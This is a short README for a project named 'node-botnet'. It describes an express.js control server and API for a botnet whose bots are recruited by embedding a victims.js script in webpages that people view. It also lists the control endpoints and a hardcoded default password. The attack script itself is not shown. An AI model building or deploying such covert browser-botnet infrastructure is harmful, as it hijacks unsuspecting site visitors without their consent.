# node-botnet
Idea for a botnet controlled by a node API. Runs on your localhost.

Bots are collected by putting the code in ```victims.js``` on the webpage they are viewing.

Uses express.js to host a control center and API for the bots to connect to.

#Instructions and Information

To start server:

```node app.js``` 

Server starts on localhost:3000

	/api 
	
	recieves the information each bot needs.

	/ui 
	
	displays the forum for sending new information to the bots. 

Default password is "98frayw4fa4hw"

	/api/post
	
	is what the forum uses to post information that is recieved with /api
